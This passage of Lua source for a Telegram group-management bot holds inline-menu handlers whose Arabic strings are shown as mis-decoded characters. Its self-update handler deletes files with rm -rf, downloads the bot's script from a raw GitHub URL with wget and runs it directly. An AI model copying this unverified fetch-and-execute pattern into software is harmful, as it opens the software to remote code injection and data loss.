keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/LockSpamList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
if DataText == '/unlockSpam:'..data.sender_user_id_ then
DevRio:hdel(Rinda.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User")  
Text = "*โ๏ธฐุชู ูุชุญ ุงูุชูุฑุงุฑ ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/GameInline:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/GameInline:'..tonumber(data.sender_user_id_)..'(.*)')
if not DevRio:get(Rinda..'Rio:Lock:Gamesinline'..data.chat_id_) then
Text =[[
*โ๏ธฐูุงุฆูู ุงูุงูุนุงุจ ุงููุชุทูุฑู ุงุถุบุท ููุนุจ*
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข โ ุงูุดุทุฑูุฌ โ โข",url='https://t.me/T4TTTTBOT?game=chess'}},{{text="โข ูุนุจุฉ ููุงุจู ุจูุฑุฏ ๐ฅ โข",url='https://t.me/awesomebot?game=FlappyBird'},{text="โข ุชุญุฏู ุงูุฑูุงุถูุงุช โข",url='https://t.me/gamebot?game=MathBattle'}},{{text="โข ุงูุณ ุงู โข",url='t.me/xobot?start'},{text="โข ุณุจุงู ุงูุฏุฑุงุฌุงุช ๐ โข",url='https://t.me/gamee?game=MotoFX'}},{{text="โข ุณุจุงู ุณูุงุฑุงุช ๐ โข",url='https://t.me/gamee?game=F1Racer'},{text="โข ูุชุดุงุจู ๐พ โข",url='https://t.me/gamee?game=DiamondRows'}},{{text="โข ูุฑุฉ ูุฏู โฝ โข",url='https://t.me/gamee?game=FootballStar'}},{{text="โข ูุฑู๐คนโโ โข",url='https://t.me/gamee?game=Hexonix'},{text="โข Hexonixโ โข",url='https://t.me/gamee?game=Hexonix'}},{{text="โข MotoFx๐๏ธ โข",url='https://t.me/gamee?game=MotoFx'}},{{text="โข ูุนุจุฉ 2048 ๐ฐ โข",url='https://t.me/awesomebot?game=g2048'},{text="โข Squares๐ โข",url='https://t.me/gamee?game=Squares'}},{{text="โข Atomic 1โถ๏ธ โข",url='https://t.me/gamee?game=AtomicDrop1'},{text="โข Corsairs โข",url='https://t.me/gamebot?game=Corsairs'}},{{text="โข LumberJack โข",url='https://t.me/gamebot?game=LumberJack'}},{{text="โข LittlePlane โข",url='https://t.me/gamee?game=LittlePlane'},{text="โข RollerDisco โข",url='https://t.me/gamee?game=RollerDisco'}},{{text="โข ๐ฆ ูุนุจุฉ ุงูุชููู ๐ฆ โข",url='https://t.me/T4TTTTBOT?game=dragon'},{text="โข ๐ ูุนุจุฉ ุงูุงูุนู ๐ โข",url='https://t.me/T4TTTTBOT?game=snake'}},{{text="โข ๐ต ูุนุจุฉ ุงูุงููุงู ๐ด โข",url='https://t.me/T4TTTTBOT?game=color'}},{{text="โข ๐ ูุนุจุฉ ุงูุตุงุฑูุฎ ๐ โข",url='https://t.me/T4TTTTBOT?game=rocket'},{text="โข ๐น ูุนุจุฉ ุงูุณูุงู ๐น โข",url='https://t.me/T4TTTTBOT?game=arrow'}},{{text="โข ูุนุจุฉ ุงููููุฌุง โข",url='https://t.me/gamee?game=GravityNinja21'},{text="โข ูุนุจุฉ ุงููุฑุชู โข",url='https://t.me/gamee?game=KarateKid2'}},{{text = 'โข TeAm Rinda โข', url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     -- 
if DataText and DataText:match('/SourceList:(.*)') then
local Rio = DataText:match('/SourceList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Source = DevRio:get(Rinda..'Rio:Source')
local Text = [[
*โ๏ธฐุงุฒเขชุงเขช ุชุญุฏูุซ เขชููุฏุง ูููููุงุช ุจเขชู*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุชุญุฏูุซ ุฑููุฏุง โข",callback_data="/UpdateSource:"..data.sender_user_id_},{text="โข ุชุญุฏูุซ ุงููููุงุช โข",callback_data="/UpdateFile:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     -- 
if DataText and DataText:match('/UpdateSource:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UpdateSource:'..tonumber(data.sender_user_id_)..'(.*)')
os.execute('rm -rf Rinda.lua') 
os.execute('wget https://raw.githubusercontent.com/RindaTeam/Rinda/master/Rinda.lua') 
dofile('Rinda.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( ุชู ุชุญุฏูุซ ุฑููุฏุง )          \n\27[0;34;49m\n") 
Text = "*โ๏ธฐุชู ุชุญุฏูุซ ุฑููุฏุง*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/SourceList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UpdateFile:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UpdateFile:'..tonumber(data.sender_user_id_)..'(.*)')
dofile('Rinda.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( ุชู ุชุญุฏูุซ ูููุงุช ุงูุจูุช )        \n\27[0;34;49m\n") 
Text = "*โ๏ธฐุชู ุชุญุฏูุซ ุงููููุงุช*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/SourceList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     -- 
if DataText and DataText:match('/MediaHome:(.*)') then
local Rio = DataText:match('/MediaHome:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Media = DevRio:get(Rinda..'Rio:Media')
local Text = [[
*โ๏ธฐุงุฒเขชุงเขช ุชุญฺชู ุจูููุฏูุง ูููุณุญ ุจเขชู*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูููุฏูุง โข",callback_data="/DelMedia:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุงุบุงูู โข",callback_data="/DelMusic:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงูุฑุณุงุฆู ุงููุนุฏูู โข",callback_data="/DelMsgEdit:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     -- 
if Cleaner(data) then
if DataText and DataText:match('/DelMedia:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelMedia:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(Rinda.."Rio:cleaner"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(data.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_Rio(data.chat_id_, data.id_, 1, "โ๏ธฐุชู ุญุฐู "..Del.." ูู ุงูููุฏูุง", 1, 'md') 
DevRio:del(Rinda.."Rio:cleaner"..data.chat_id_)
else
Text = "*โ๏ธฐูุง ุชูุฌุฏ ููุฏูุง ููุง*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/MediaHome:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText and DataText:match('/DelMusic:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelMusic:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(Rinda.."Rio:cleanermusic"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(data.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_Rio(data.chat_id_, data.id_, 1, "โ๏ธฐุชู ุญุฐู "..Del.." ูู ุงูุงุบุงูู", 1, 'md') 
DevRio:del(Rinda.."Rio:cleanermusic"..data.chat_id_)
else
Text = "*โ๏ธฐูุง ุชูุฌุฏ ุงุบุงูู ููุง*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/MediaHome:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end end
if DataText and DataText:match('/DelMsgEdit:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelMsgEdit:'..tonumber(data.sender_user_id_)..'(.*)')
Rio_Del = {[0]= data.id_}
local Message = data.id_
for i=1,100 do
Message = Message - 1048576
Rio_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = data.chat_id_,message_ids_ = Rio_Del},function(arg,data)
new = 0
Rio_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Rio_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(data.chat_id_,Rio_Del2)
end,nil)  
Text = "*โ๏ธฐุชู ุชูุธูู ุงูุฑุณุงุฆู ุงููุนุฏูู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/MediaHome:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     -- 
if DataText and DataText:match('/LeaveBot:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LeaveBot:'..tonumber(data.sender_user_id_)..'(.*)')
if DevRio:get(Rinda.."Rio:Left:Bot"..Rinda) then
EditMsg(Chat_Id2, Msg_Id2,  "โ๏ธฐุงููุบุงุฏุฑู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู", 'md')
return false  
end
EditMsg(Chat_Id2, Msg_Id2,  "*โ๏ธฐุชู ูุบุงุฏุฑุฉ ุงููุฌููุนู \nโ๏ธฐุชู ุญุฐู ุฌููุน ุจูุงูุงุชูุง*", 'md')
ChatLeave(data.chat_id_, Rinda) 
DevRio:srem(Rinda.."Rio:Groups",data.chat_id_)
end           
if DataText and DataText:match('/NoLeaveBot:(.*)') then
local Rio = DataText:match('/NoLeaveBot:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2, "*โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุทุฑุฏ ุงูุจูุช*")
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ุงูุงูุฑ ููุณ ูู .")..'&show_alert=true')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     -- 
if DataText and DataText:match('/Linkinline:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/Linkinline:'..tonumber(data.sender_user_id_)..'(.*)')
if not DevRio:get(Rinda.."Rio:Lock:GpLinksinline"..data.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..data.chat_id_)) or DevRio:get(Rinda.."Private:Group:Link"..data.chat_id_) 
if linkgpp.ok == true then 
local Text = 'โ๏ธฐ๐ซ๐๐๐ ๐ฆ๐๐๐๐ โฌ โค\n-----------------------------------------\n['..ta.title_..']('..linkgpp.result..')'
keyboard = {}  
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..data.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else 
end 
end,nil) 
end
end
if DataText and DataText:match('/LinkText:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LinkText:'..tonumber(data.sender_user_id_)..'(.*)')
if not DevRio:get(Rinda..'Rio:Lock:GpLinks'..data.chat_id_) then 
if DevRio:get(Rinda.."Rio:Groups:Links"..data.chat_id_) then
send(data.chat_id_, data.id_, "โ๏ธฐGroup Link โฌโฏ\n-----------------------------------------\n"..DevRio:get(Rinda.."Rio:Groups:Links"..data.chat_id_), 1, "html")
else 
send(data.chat_id_, data.id_, 1, 'โ๏ธฐูุงููุฌุฏ ุฑุงุจุท ุงุฑุณู โข ุถุน ุฑุงุจุท ุงู ุงุฑุณู โข ุงูุดุงุก ุฑุงุจุท ููุงูุดุงุก', 1, 'md')
end
else
end
end


--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/lockorder:(.*)') then
local Rio = DataText:match('/lockorder:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local order = DevRio:get(Rinda..'Rio:order')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ุงูุงูุฑ ุงูุชุนุทูู ูุงูุชูุนูู โขโฏ
-----------------------------------------
โ๏ธฐููููู ุงูุชุนุทูู ูุงูุชูุนูู ุนู ุทุฑูู ุงูุงุฒุฑุงุฑ ุจูุงุณูู
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุชุนุทูู ุงูุงูุฏู ุจุงูุตูุฑู โข",callback_data="/LockIdPhoto:"..data.sender_user_id_},{text="โข ุชูุนูู ุงูุงูุฏู ุจุงูุตูุฑู โข",callback_data="/UnLockIdPhoto:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุงูุฏู โข",callback_data="/LockId:"..data.sender_user_id_},{text="โข ุชูุนูู ุงูุงูุฏู โข",callback_data="/UnLockId:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุฑุงุจุท โข",callback_data="/LockGpLinks:"..data.sender_user_id_},{text="โข ุชูุนูู ุงูุฑุงุจุท โข",callback_data="/UnLockGpLinks:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุฑุงุจุท ุงููุงูู โข",callback_data="/LockGpLinksinline:"..data.sender_user_id_},{text="โข ุชูุนูู ุงูุฑุงุจุท ุงููุงูู โข",callback_data="/UnLockGpLinksinline:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุชุฑุญูุจ โข",callback_data="/LockWelcome:"..data.sender_user_id_},{text="โข ุชูุนูู ุงูุชุฑุญูุจ โข",callback_data="/UnLockWelcome:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุฑุฏูุฏ ุงููุทูุฑ โข",callback_data="/LockAllRed:"..data.sender_user_id_},{text="โข ุชูุนูู ุงูุฑุฏูุฏ ุงููุทูุฑ โข",callback_data="/UnLockAllRed:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุฑุฏูุฏ ุงููุฏูุฑ โข",callback_data="/LockGpRed:"..data.sender_user_id_},{text="โข ุชูุนูู ุฑุฏูุฏ ุงููุฏูุฑ โข",callback_data="/UnLockGpRed:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ูุฒููู โข",callback_data="/LockDelMe:"..data.sender_user_id_},{text="โข ุชูุนูู ูุฒููู โข",callback_data="/UnLockDelMe:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุงุทุฑุฏูู โข",callback_data="/LockKickMe:"..data.sender_user_id_},{text="โข ุชูุนูู ุงุทุฑุฏูู โข",callback_data="/UnLockKickMe:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุญุธุฑ โข",callback_data="/LockKickBan:"..data.sender_user_id_},{text="โข ุชูุนูู ุงูุญุธุฑ โข",callback_data="/UnLockKickBan:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุฑูุน โข",callback_data="/LockProSet:"..data.sender_user_id_},{text="โข ุชูุนูู ุงูุฑูุน โข",callback_data="/UnLockProSet:"..data.sender_user_id_}},{{text="โข ุชุนุทูู ุงูุงูุนุงุจ โข",callback_data="/LockGames:"..data.sender_user_id_},{text="โข ุชูุนูู ุงูุงูุนุงุจ โข",callback_data="/UnLockGames:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/HelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(order or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/LockIdPhoto:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockIdPhoto:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda..'Rio:Lock:Id:Photo'..data.chat_id_,true)
Text = "*โ๏ธฐุชุนุทู ุงูุงูุฏู ุจุงูุตูุฑู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/unLockIdPhoto:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/unLockIdPhoto:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Lock:Id:Photo'..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ุงูุงูุฏู ุจุงูุตูุฑู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockId:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockId:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda..'Rio:Lock:Id'..data.chat_id_,true)
Text = "*โ๏ธฐุชุนุทู ุงูุงูุฏู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/unLockId:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/unLockId:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Lock:Id'..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ุงูุงูุฏู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockGpLinks:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockGpLinks:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda.."Rio:Lock:GpLinks"..data.chat_id_,"ok")
Text = "*โ๏ธฐุชุนุทู ุงูุฑุงุจุท*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/unLockGpLinks:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/unLockGpLinks:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:Lock:GpLinks"..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ุงูุฑุงุจุท*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockGpLinksinline:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockGpLinksinline:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda.."Rio:Lock:GpLinksinline"..data.chat_id_,"ok")
Text = "*โ๏ธฐุชุนุทู ุงูุฑุงุจุท ุงููุงูู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UnLockGpLinksinline:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UnLockGpLinksinline:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:Lock:GpLinksinline"..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ุงูุฑุงุจุท ุงููุงูู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockWelcome:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockWelcome:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:Lock:Welcome"..data.chat_id_)
Text = "*โ๏ธฐุชุนุทู ุงูุชุฑุญูุจ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UnLockWelcome:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UnLockWelcome:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda.."Rio:Lock:Welcome"..data.chat_id_,true)
Text = "*โ๏ธฐุชูุนู ุงูุชุฑุญูุจ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
